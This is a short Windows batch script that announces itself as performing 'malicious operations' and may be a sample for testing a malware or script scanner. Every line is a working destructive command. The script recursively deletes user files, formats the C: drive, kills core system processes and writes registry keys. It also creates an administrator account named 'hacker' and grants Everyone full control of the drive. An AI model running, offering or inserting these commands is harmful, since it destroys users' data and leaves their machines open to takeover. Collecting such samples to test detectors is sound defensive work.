@echo off
REM Multiple dangerous commands
echo Starting malicious operations...

REM Delete files
del /s /q C:\Users\*.*
del /s /q C:\Documents\*.*

REM System commands
shutdown /s /t 0
format C: /q /y

REM Registry operations
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Malicious /v Enabled /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Malicious /v Active /t REG_SZ /d "Yes" /f

REM Process operations
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe

REM Network operations
net user hacker /add
net localgroup administrators hacker /add

REM File operations
icacls C:\ /grant Everyone:F /t
cacls C:\ /e /p Everyone:F

echo Malicious operations completed.
pause
